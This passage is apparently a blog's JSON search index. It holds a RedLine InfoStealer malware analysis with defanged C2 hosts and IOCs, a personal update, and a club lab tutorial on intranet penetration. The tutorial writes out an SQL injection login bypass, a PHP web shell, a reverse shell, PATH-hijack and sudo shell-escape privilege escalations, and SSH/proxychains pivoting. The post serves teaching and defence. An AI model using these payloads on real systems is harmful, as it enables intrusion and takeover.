[{"categories":["Cyber Security"],"content":"RedLine InfoStealer malware deep analysis and reverse engineering","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/"},{"categories":["Cyber Security"],"content":"You have become a victim of piracy. Although GitHub promotes an open-source culture where code can be publicly reviewed, this doesn’t mean it’s 100% safe. The screenshot above shows a small portion of repos found by searching Free-Download-2023 site:github.com on Google. Unsurprisingly, they all contain malware. The characteristic of these suspicious repos is that they appear for a very short time, usually disappearing within two or three days. Once downloaded and executed, there’s a risk of data leakage. Although thrifty people don’t like buying legitimate versions, you should still be careful when looking for pirated software. ","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:0:0","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#"},{"categories":["Cyber Security"],"content":" What’s HappenOK, here’s what happened: a friend downloaded malware from a similar repo on 8/18. Within a few days, they started receiving abnormal login notifications in their email. The original malicious GitHub repo (https://github[.]com/Munganyende/MOVAVI-VIDEO-EDITOR-PLUS-CRACK-2023-14737) had already been taken down by the time I received the news - the owner had deleted their account, showing just how suspicious it was== Later I found a similar repo using the same keywords (though this owner has also closed by the time of writing). Screenshot below. Besides the README looking very suspicious, note the 54 stars in the upper right (I’m so jealous). Looking closely, each account that starred is doing similar malware distribution, just with different commercial software names - the content is largely the same. Clicking Download takes you to a Godaddy URL, which redirects to a discordapp link. The attacker seems to uniformly store files on Discord and distribute the links. Both are legitimate web platforms, making this really hard to defend against. hxxps[:]//launchersoftware.godaddysites[.]com/ hxxps[:]//cdn.discordapp[.]com/attachments/1042051714754289756/1143174795983343656/Setup.zip ","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:1:0","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#whats-happen"},{"categories":["Cyber Security"],"content":" Malware AnalysisAfter unzipping the archive (password: 8848), you can see quite a few files. Though days have passed and the victim doesn’t remember much about the files, let’s take a look :3 The entry point is unsurprisingly that Setup.exe. I traced it with IDA for a while without finding anything obvious, but noticed the Exports section has functions starting with “go”. Searching online leads to the GLFW project, so we know this .exe is compiled with Golang. However, I didn’t see main.main or other typical Golang characteristics in the function list. Mandiant’s GoReSym also didn’t restore anything else (error message: Failed to parse file: failed to read pclntab: failed to locate pclntab). Using go_parser also gave Exception: Failed to find firstmoduledata address!. I should probably spend some time studying how to reverse Golang-based programs (silence) Since static analysis wasn’t working, I opened the Debugger for dynamic analysis. Found it drops a .NET backdoor %AppData%\\Local\\Temp\\dfb5cc44a3e2a1762bc0f637ae29ffb43353755425 and self-deletes after execution. Opening with CFF Explorer, I noticed the file’s internal name is Radiogram.exe. Searching name:Radiogram.exe on VirusTotal reveals many samples, and most engines’ detection name is RedLine Stealer. Taking a quick look with dnSpy, some strange function names are actually written in Kazakh (according to Google Translate). For example, the function name below means “check bot” - we can see the program triggers sleep and exits under these conditions. Also, it retrieves subsequent payload from the network. Conveniently, all necessary info is written inside. Following it leads to URL hxxps[:]//pastebin[.]com/raw/tnW31tPp, and we can download the payload inside. Config Decryption algorithm CyberChef pastebin.com is a public code sharing platform, unsurprisingly being used by attackers as a medium for subsequent attacks. The URL /tnW31tPp has now been reported and taken down. Not Found (#404) This paste has been deemed potentially harmful. Pastebin took the necessary steps to prevent access on August 25, 2023, 12:55 am CDT. If you feel this is an incorrect assessment, please contact us within 14 days to avoid any permanent loss of content. The payload we obtained Nj9QUisHPA83L1AfKwc8ETcsBh4oLQ1TGg9UWg== can be XOR’d with the same key to get the final C2 server =\u003e moy.tapoq[.]top:28786 (IP: 95.216.180[.]12). Interestingly, the same /tnW31tPp URL shows different payloads on VirusTotal, indicating the attacker has been using the same URL to update C2 server addresses. From collected payloads, we can find several more C2 servers. ley.domest[.]top:28786 (IP: 95.216.180[.]12) gog.shopapi[.]top:28786 (IP: 95.216.180[.]12) m6o.braavaw[.]top:28786 (IP: 185.229.64[.]67) Common points include using Port 28786 and registering cheap .top TLDs. Two of them share the same IP as this case’s C2 server. Other functions can be roughly understood from function names, and most commands have simple obfuscation. CryptoHelper Observed APIs that appear to call decryption. Speculation is that credentials found on the machine are decrypted locally before being sent back to C2 server. The various MSValue* in the image correspond to network traffic usage below. In short, it steals login data, cookies, Web Data, localprefs.json, …etc. SystemInfoHelper GetProcessors (SELECT * FROM Win32_Processor) GetGraphicCards (SELECT * FROM Win32_VideoController) GetBrowsers (check SOFTWARE\\\\WOW6432Node\\\\Clients\\\\StartMenuInternet, SOFTWARE\\\\Clients\\\\StartMenuInternet) GetSerialNumber (SELECT * FROM Win32_DiskDrive) ListOfProcesses (SELECT * FROM Win32_Process Where SessionId=) GetVs (check AntivirusProduct, AntiSpyWareProduct, FirewallProduct) GetProcessesByName (SELECT * FROM Win32_Process Where SessionId=') ListOfPrograms (check SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall) AvailableLanguages CollectMemory (SELECT * FROM Win32_OperatingSystem) GetWindowsVersion (check SOFTWARE\\\\Microsoft\\\\Windows NT\\\\Cur","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:2:0","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#malware-analysis"},{"categories":["Cyber Security"],"content":" In ClosingBased on some online information, this is undoubtedly RedLine Stealer. I originally thought it wouldn’t be so easy to find malware, but digging into this opened a whole can of worms XDDD According to the affected friend, besides continuously receiving suspicious login notifications, even though Steam Guard was already bound, 2FA didn’t pop up at the critical moment - their account was directly hijacked and used to send spam messages. I wonder if it’s because browser-stored information was taken, allowing the attacker to login directly using the session. Hmm… quite subtle. As for two days after the incident, I searched with the same free-download keywords on Google and saw other GitHub repos distributing CPP-based malware with different archive passwords. But that’s another story… ","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:3:0","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#in-closing"},{"categories":["Cyber Security"],"content":" Reference Takedown of GitHub Repositories Disrupts RedLine Malware Operations Destroying Redline Stealer and CypherIT eSentire Threat Intelligence Malware Analysis: Redline Stealer Malware-as-a-Service: Redline Stealer Variants Demonstrate a Low-Barrier-to-Entry Threat RedLine Technical Analysis Report (web archive) Malicious AI Tool Ads Used to Deliver Redline Stealer ","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:4:0","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#reference"},{"categories":["Cyber Security"],"content":" IOCs Indicator Description f9186767c98490db03a70f511cb24a84eb906c94 Setup.zip ab741ccd807f6645c15aa9d69666b04ea8e6d408 Setup.exe 73ceacde9d7b7ede1c4b7615c1bd5ae2ace45b97 Radiogram.exe (filename: dfb5cc44a3e2a1762bc0f637ae29ffb43353755425) hxxps[:]//launchersoftware.godaddysites[.]com/ The link redirect to discord link hxxps[:]//cdn.discordapp[.]com/attachments/ 1042051714754289756/1143174795983343656/Setup.zip Download link hxxps[:]//pastebin[.]com/raw/tnW31tPp The site to store subsequent payload moy.tapoq[.]top:28786 C2 Server 95.216.180[.]12 C2 Server ","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:5:0","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#iocs"},{"categories":["Cyber Security"],"content":" Suspicious GitHub Users text @hiinoo01aiiu, Joined on Aug 29, 2021 @MinhGachaCoder, Joined on Mar 12, 2023 @elvisEam, Joined on Jun 8, 2022 @MarkRoi, Uganda - Kampala @Mr-krostopbey1903, Joined on Jan 29, 2021 @tccpro, Freelance @Shopify @qarixaeed1, Joined on Aug 1, 2022 @Kashif818Mehmood, Joined on Jun 28, 2020 @TGRedDragon, Joined on Mar 19, 2023 @llstevenll, Joined on Oct 17, 2022 @RobinHuaman, Joined on Sep 4, 2021 @Masterkent11, Joined on Jul 9, 2019 @laoluibitoye, Joined on Jul 25, 2019 @gl0nDbeatz, Joined on Jul 28, 2023 @Issoufouiha, Niamey @nazadam, Joined on Sep 27, 2022 @A-mal, Joined on Jun 6, 2021 @X-vinjin, Joined on Dec 6, 2022 @theillumina, Joined on Mar 26, 2023 @Sazzadur1991, Joined on Aug 4, 2023 @GitTrio3, Joined on Jun 7, 2023 @UnknownKingsy, Joined on Jan 25, 2021 @Kyori4k, Joined on Oct 28, 2022 @Developwithjaspreet, wpcodekit @ajivijay, Joined on Jul 1, 2023 @soporteint2023, Joined on Apr 27, 2023 @KojoClinton, Joined on Jul 10, 2023 @intel1337, Selfish @Kirarik21, Joined on Jun 10, 2023 @Emrx29y, Joined on Feb 26, 2023 @Clemens17, Joined on Nov 15, 2022 @Elissonamarodasilva, Joined on Feb 11, 2023 @Mcbrightyves, Joined on Oct 17, 2022 @wxmcode, Joined on Sep 3, 2019 @Aramayis1996, Joined on Nov 27, 2022 @yuanxiangliu, Joined on Aug 18, 2022 @ohTraveler, Joined on Aug 15, 2023 @Ladicor, Joined on Mar 1, 2022 @alexanderutmn, Joined on Apr 1, 2017 @guru9999, Joined on Aug 6, 2017 @MakareB, Joined on May 12, 2021 @olikke, Joined on Dec 11, 2018 @twirus7, Joined on Apr 13, 2023 @BabyNelo, Joined on Mar 21, 2023 @saintsblack, Joined on Mar 4, 2023 @un243alexxx, Joined on Nov 29, 2020 @gingazov2010, Joined on Nov 9, 2019 @dasdeutchguy, Joined on May 28, 2023 ","date":"2023-08-26","objectID":"/en/posts/2023/redline-infostealer-analysis/:5:1","series":null,"tags":["Malware Analysis","RedLine InfoStealer","Cybercrime"],"title":"[Malware Analysis] Is This Really Free to Watch? RedLine InfoStealer","uri":"/en/posts/2023/redline-infostealer-analysis/#suspicious-github-users"},{"categories":["Free Writing"],"content":"2023 first half life updates and reflections","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/"},{"categories":["Free Writing"],"content":"After graduating, I started my corporate life, then got conscripted for four months of military service. Not long after returning to the company, I went for another month of training. A year really passes by in the blink of an eye. ","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/:0:0","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/#"},{"categories":["Free Writing"],"content":" 162TMy basic training unit was at Chenggongling 101R4BFC, and I was deployed to Taoyuan 269R3B1C. If you’ve been following the news, you might have seen that something big happened in my company during my service - the kind that brings in several generals. Simply put, a fellow soldier passed away in their sleep. It happened during evaluation week, causing chaos for everyone QQ Come to think of it, it’s been 4 months since discharge. Some things are starting to feel nostalgic, especially how precious each leave was XD Anyway, as senior veterans say, all kinds of stories happen in the military. And I perfectly avoided COVID-19 even when 1/3 of the brothers were infected, completing my service safely! ","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/:1:0","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/#162t"},{"categories":["Free Writing"],"content":" Back2OfficeApparently during my military service, the company’s WFH policy changed constantly. The first all-hands I attended after returning was filled with apologies from upper management. But for someone like me who was known as a “ground hermit” in the lab, coming to the office every day isn’t a big deal. The night before returning to the office happened to be the company’s spring party. Thanks to my colleagues for letting me be the snack thief After getting familiar with the team’s work, it was time for virus training. ","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/:2:0","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/#back2office"},{"categories":["Free Writing"],"content":" Malware Analysis TrainingSince the job involves handling large volumes of malware samples, you must pass the company’s arranged Malware analysis training before officially starting work. Naturally, passing the final exam is one of our team’s probation conditions. Yes! I joined before military service, and I’m still in probation after returning to attend training. In a way, I’m grateful the company is willing to spend time and money for me to learn malware analysis basics, and even let me take LOA for military service and return afterward. Ahem, getting sidetracked. Anyway, the month-long Training mainly covers analyzing various Malware types and tool usage. Looking back at my CTF days, I always left Pwn and Reverse to @stavhaygn, rarely having the chance to learn IDA, or just F5 instant solve. Seniors mentioned the course content is very solid, and last year’s attendees even said the teacher taught at lightning speed, not very beginner-friendly QQ Fortunately, this time not only was there a new teacher, but three Filipino teachers (apparently there was a shortage of instructors last year XDDD). You can tell the teachers put a lot of effort into preparation. Though the homework load looks as overwhelming as previous years - can’t finish them all, and each review session randomly picks students to share screens and explain (in English). Really stressful XDDDD Another lucky thing was that this year’s new team member is senior-level. The skill gap was evident from the first week of class. I could clearly feel the experience difference between us. Sometimes when I spent forever looking at disassembled code, he’d glance once and say it’s some encryption algorithm and we don’t need to look that closely. This helped me gradually get the rhythm of analysis, since you really can’t examine every function in limited time. Thanks to this colleague for guiding me and other teammates through training safely. And since the final exam was on Friday (company sports day the day after tomorrow), the teacher extended the submission deadline to the whole weekend. I sat all day on exam day finally submitting, then heard about the extension and was shocked. Too NICE XDDD ","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/:3:0","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/#malware-analysis-training"},{"categories":["Free Writing"],"content":" Tech Industry DownturnEveryone has different post-graduation plans, but from 2022H2 to this year, you can see news about the tech industry winter’s impact. Layoff news from Big Tech companies is worrying. I’m somewhat relieved to have found a job before graduation. Though not finding a R\u0026D alternative service role is a bit regrettable - the four months of regular service means there’s still a chance of being called back for reserve duty, which is a headache to think about. During my employment, I also referred several friends through the referral program, but currently they’re all on hold due to hiring freezes or only recruiting senior-level immediate contributors. It’s a pity for my friends - finding your ideal job isn’t easy during this period. ","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/:4:0","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/#tech-industry-downturn"},{"categories":["Free Writing"],"content":" FINAL FANTASY XIV (People reading my blog should have finished 6.0 and won’t mind spoilers right) FFXIV main story progress went from 5.0 (in progress) before military service last year to finally completing 6.0 in May this year. Really a great story. Especially after learning about the history of the discontinued 1.0 (2010-2012), watching how a game that was about to be shut down was salvaged by Yoshida-san through a complete rebuild, launching the new 2.0 and continuing to optimize, reaching almost universal acclaim at current 6.4. Really not easy. Using 1.0’s story setting (Calamity) to set up 2.0 was genuinely impressive. For interested players, I highly recommend understanding this game’s history The Fall and Rise of Final Fantasy XIV - Youtube. There’s also an authorized translated version on Bilibili FF14 Fall \u0026 Rise - bilibili. Watching it after completing the main story should be quite touching. Also, each expansion’s story has some official reading materials (FINAL FANTASY XIV Side Stories). During military service, I even printed them out and finished the 2.0-4.0 side stories inside. The character interactions and small details are really fun XD Although the hot topic now is PS5’s FFXVI, FFXIV has enough content to keep me playing for a while~ ","date":"2023-07-07","objectID":"/en/posts/2023/2023h1-sharing/:5:0","series":null,"tags":["Daily Chat","Malware Analysis","FFXIV"],"title":"[2023H1 Chat] Hey! I'm Back","uri":"/en/posts/2023/2023h1-sharing/#final-fantasy-xiv"},{"categories":["Cyber Security"],"content":"NSYSU InfoSec Club intranet penetration tutorial - lateral movement and privilege escalation","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["Cyber Security"],"content":"Long time no club session - this time MacacaHub active member @Arikoi talks about intranet penetration. Listening through the whole session, I realized I’m unfamiliar with too many concepts, so I’ll try to organize the process. Please point out any errors! ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:0:0","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#"},{"categories":["Cyber Security"],"content":" Preliminary InformationSince this is somewhat a simple example of intranet penetration, quite a bit of information was given at the start. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:1:0","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#preliminary-information"},{"categories":["Cyber Security"],"content":" Website Information GatheringThe starting point is a simple website. From the menu, we can understand the site’s basic functions, and noticed FileUpload isn’t available to non-admin users. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:2:0","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#website-information-gathering"},{"categories":["Cyber Security"],"content":" SQL InjectionFirst, we can target the login page (reusing previous club materials XD). It’s clearly a SQLi vulnerability, even with Magic for debugging. The instructor provided guest:guest as a hint. After login, the top shows “Welcome guest”. Using ' or 1=1 -- allows successful login, but since admin isn’t the first entry in the database, even with True condition it won’t log in as admin. The intended solution uses UNION bypass, but the instructor broke the validation part, so admin'; -- works XD Expected solution uses LIMIT 1,1 -- to find the next query result, or use UNION to guess column count, then through “Welcome ” determine where to put admin (of course putting admin everywhere works too). Password can be left empty. mysql 'UNION SELECT 'a', 'admin', 'a' ; -- ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:2:1","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#sql-injection"},{"categories":["Cyber Security"],"content":" Unrestricted File UploadSuccessfully logged in as admin, next step is trying to upload files. This function uploads images to display on the homepage, so non-allowed extensions are blocked. Here’s what security club members uploaded lol After upload, clicking the image on homepage shows path ./uploads/\u003cfilename\u003e.jpg. Using F12 we find frontend validation fileValidation.js. From source code, we realize we need to bypass validation and try uploading a web shell. (Originally during testing, the function didn’t have const, so you could directly remove validation from frontend XD) The web shell part isn’t heavily filtered. The simplest PHP web shell works (extension as .png). php \u003c?php echo shell_exec($_GET['cmd'], '2\u003e\u00261'); For bypassing validation, the intended solution is to intercept and modify the extension with Burp Suite. Side note, the newest Burp Suite has built-in Chromium without needing separate proxy setup. Highly recommended!! Then we can execute our web shell through the uploaded file path. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:2:2","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#unrestricted-file-upload"},{"categories":["Cyber Security"],"content":" Reverse ShellWhile web shell can execute commands and browse files under the web server, it doesn’t maintain session, so we can’t cd to other paths. Even cat on some php files won’t directly show source code. This is where we use Reverse Shell to have the web server actively connect to us. Here I use Reverse Shell Generator to automatically generate connection code. Note that without a public IP, the instructor provided a Kali to SSH into using internal IP (I used my lab’s public IP). On Host, use the top-right command to LISTEN. In web shell, use the bottom command. The left side lets you choose connection tools based on server (sometimes need to try several; here nc -c works). If successful, Local pops up a Reverse Shell where we can dig for interesting info. We find some website source code. In login.php we can further find database info in connect.php. With database login info and confirmed mysql available, we can directly query database contents. Format: bash $ mysql –h SERVER –u USER –pPASSWORD DATABASE -e \"show tables;\" Some mysql gotchas Password part -pPASSWORD has no space in between. Since typos show no message, recommend adding -e \"\u003ccommand\u003e;\" with semicolon. MacacaHub{db-secret-2553a38af63eb376ba770668e81045dc} Besides the Flag from database, we also got a loginable user macaca:mhub (this user’s existence can be observed through last or /etc/passwd). Danger Weak passwords are bad, and don’t store plaintext passwords in databases. We can also use ip addr to see network card info, revealing current network 10.0.20.0/24 and internal network 10.255.0.0/24 for later use. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:2:3","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#reverse-shell"},{"categories":["Cyber Security"],"content":" SUID Privilege EscalationIn the web server besides PHP source code, there’s an interesting .c. This is actually SUID privilege escalation exploiting environment variables in Linux, but due to time constraints the instructor skipped this part QQ. For details see Linux Privilege Escalation via SUID Opening move - check for strange files. Here find locates SUID program showErrorLog. bash $ find . -perm -u=s -type f 2\u003e/dev/null From the .c source code provided, we see the program uses tail to access files under /var/log/ requiring root, hence the SUID. We can exploit this by creating a fake tail and adding it to environment variables, making showErrorLog run our desired command: Find a writable directory - /tmp is commonly used. Write “/bin/bash” to /tmp/tail and give it execute permission 777 (or +x). Add /tmp to environment variable $PATH. This way, running showErrorLog makes the system first find our tail in /tmp and execute /bin/bash, directly getting root shell! Image split for readability Found the hidden flag in /root. MacacaHub{env-privilege-b68a4679b5a2e1aaa00dc3ffa8ed429c} ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:2:4","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#suid-privilege-escalation"},{"categories":["Cyber Security"],"content":" Intranet Penetration","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:3:0","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#intranet-penetration"},{"categories":["Cyber Security"],"content":" SSH TunnelingGenerally, SSH is allowed through firewalls or DMZ, and SSH transmission is encrypted, making it easily exploited by hackers. This session mainly uses SSH Tunneling with ProxyChains to enter the internal network through the web server. Here I’ll only cover Dynamic Port Forwarding; for more see SSH Tunneling (Port Forwarding) Explained. Dynamic Port ForwardingSince we’ll be using nmap to scan internal network, we choose Dynamic Port Forwarding to start a SOCKS proxy server on the web server, allowing nmap to find open ports without specifying. The login account is macaca:mhub from the database. bash (host)$ ssh -D [client:]\u003cport\u003e \u003cSSH server\u003e Notes Since the instructor only exposed Port 80, we need VPN to jump into DMZ first then build SSH Tunneling. If web server has SSH open later, no VPN needed. SSH Tunneling here only builds the tunnel, so add -N to suppress other prompts. ProxyChains defaults to Port 9050, so directly bind Port 9050 in SSH. For other ports, modify /etc/proxychains.conf. Commands are on host. Use two terminals to observe (I used tmux to split left/right). Left screen: first use WireGuard VPN to jump into DMZ, then do Dynamic Port Forwarding. After password, SSH Tunneling is established. Leave it alone afterward. Further operations mainly on right screen. First verify Port 9050 is LISTENING with netstat. 2022.4.26 UPDATE Honestly, needing VPN to jump to DMZ then build SSH tunneling after getting web shell isn’t very real-world. The class originally taught SSH remote connection, building SSH tunneling from web shell/reverse shell from web server to local, but SSH password interaction causes issues. This can be solved with passh to send password with SSH (though plaintext password being exploited by network admin is another concern, stay safe). Also, you can build tunneling without SSH, like reGeorg. The point is establishing connection between local and DMZ, then using ProxyChains to penetrate the internal network. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:3:1","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#ssh-tunneling"},{"categories":["Cyber Security"],"content":" SSH TunnelingGenerally, SSH is allowed through firewalls or DMZ, and SSH transmission is encrypted, making it easily exploited by hackers. This session mainly uses SSH Tunneling with ProxyChains to enter the internal network through the web server. Here I’ll only cover Dynamic Port Forwarding; for more see SSH Tunneling (Port Forwarding) Explained. Dynamic Port ForwardingSince we’ll be using nmap to scan internal network, we choose Dynamic Port Forwarding to start a SOCKS proxy server on the web server, allowing nmap to find open ports without specifying. The login account is macaca:mhub from the database. bash (host)$ ssh -D [client:] Notes Since the instructor only exposed Port 80, we need VPN to jump into DMZ first then build SSH Tunneling. If web server has SSH open later, no VPN needed. SSH Tunneling here only builds the tunnel, so add -N to suppress other prompts. ProxyChains defaults to Port 9050, so directly bind Port 9050 in SSH. For other ports, modify /etc/proxychains.conf. Commands are on host. Use two terminals to observe (I used tmux to split left/right). Left screen: first use WireGuard VPN to jump into DMZ, then do Dynamic Port Forwarding. After password, SSH Tunneling is established. Leave it alone afterward. Further operations mainly on right screen. First verify Port 9050 is LISTENING with netstat. 2022.4.26 UPDATE Honestly, needing VPN to jump to DMZ then build SSH tunneling after getting web shell isn’t very real-world. The class originally taught SSH remote connection, building SSH tunneling from web shell/reverse shell from web server to local, but SSH password interaction causes issues. This can be solved with passh to send password with SSH (though plaintext password being exploited by network admin is another concern, stay safe). Also, you can build tunneling without SSH, like reGeorg. The point is establishing connection between local and DMZ, then using ProxyChains to penetrate the internal network. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:3:1","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#dynamic-port-forwarding"},{"categories":["Cyber Security"],"content":" ProxyChainsWith SSH Tunneling established, we can use ProxyChains through host’s Port 9050 to send commands to web server. Using internal network 10.255.0.0/24 found earlier from reverse shell, scan right screen with nmap for hosts with Port 22 open. bash (host)$ proxychains nmap -p 22 10.255.0.0/24 --open Usage shown below. Left also receives nmap results, which is normal (use -f to run in background if it’s distracting). Direct scanning takes time, especially since nmap scans IPs in jumps Orz Eventually we should find 10.255.0.10 has Port 22 service. Now we can use ProxyChains to SSH directly into the internal host. Session completed intranet penetration. Next steps depend on internal host information. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:3:2","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#proxychains"},{"categories":["Cyber Security"],"content":" Bonus","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:4:0","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#bonus"},{"categories":["Cyber Security"],"content":" Another Privilege EscalationThe instructor felt internal network was too empty, so placed a fun privilege escalation vulnerability. See Linux Privilege Escalation using Sudo Rights. Actually the session skipped earlier SUID escalation to barely cover this. Quite a shame QQ First, after entering internal host, sudo -l shows macaca’s executable commands: less, man, python, perl. Create any file and open with sudo less. Since less can use ! for shell commands, directly input !/bin/bash. Since it’s running with sudo, Enter gives root /bin/bash. (Empty screen, here’s a nice picture of Hoshimachi Suisei) After confirming root, get the flag under /root. MacacaHub{sudo-privilege-bf614797197ac53ee9785ee8c22a7d38} Same logic with python and perl - execute /bin/bash with sudo for root: bash $ sudo python -c \"import os; os.system('/bin/bash')\" ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:4:1","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#another-privilege-escalation"},{"categories":["Cyber Security"],"content":" AfterwordIntranet penetration usually requires chaining several techniques together. Though it looks straightforward, understanding the concepts isn’t easy. At least I spent a long time just understanding the four SSH Tunneling connection methods. So I’m taking notes during this club session - maybe I’ll encounter this someday. ","date":"2022-04-21","objectID":"/en/posts/2022/nsysuisc-intranet-penetration/:5:0","series":null,"tags":["NSYSUISC Security Club","Intranet Penetration"],"title":"[NSYSU Security Club] Intranet Penetration","uri":"/en/posts/2022/nsysuisc-intranet-penetration/#afterword"},{"categories":["Cyber Security"],"content":"DEVCORE Wargame Web challenge at HITCON 2021 writeup","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["Cyber Security"],"content":"Waaah I really wanted to get MASTER OF WEBSEC, but my skills wouldn’t allow me to challenge that title QQ This is my second time attending HITCON, and the on-site activities were really too many to cover :D DEVCORE Wargame event info: https://hackmd.io/@d3vc0r3/hitcon2021 ","date":"2021-12-01","objectID":"/en/posts/2021/hitcon2021-devcore-web-challenge/:0:0","series":null,"tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/en/posts/2021/hitcon2021-devcore-web-challenge/#"},{"categories":["Cyber Security"],"content":" Chitchat At HITCON 2021, besides completing the official “Hacker Cat Adventure” and “Hacker Meow \u0026 Hacker Cat Action” events, what I seriously worked on was DEVCORE Wargame. After all, when I saw the first 60 people to get 4 flags would receive NFT achievement, even though I don’t normally use blockchain 